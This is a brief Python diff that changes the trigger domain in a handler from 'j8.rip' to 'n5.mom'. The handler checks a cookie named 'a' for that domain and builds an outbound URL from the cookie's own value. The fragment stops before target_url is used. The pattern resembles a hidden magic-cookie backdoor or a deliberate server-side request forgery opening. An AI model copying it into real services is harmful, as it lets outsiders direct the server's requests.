@@ -11,7 +11,7 @@ def handle_request():
     cookies = request.cookies
 
     # 检查Cookie是否包含键名为'a'，且值包含"j8.rip"
-    if 'a' in cookies and 'j8.rip' in cookies['a']:
+    if 'a' in cookies and 'n5.mom' in cookies['a']:
         a_value = cookies['a']
         
         target_url = "http://{}".format(a_value[1:])
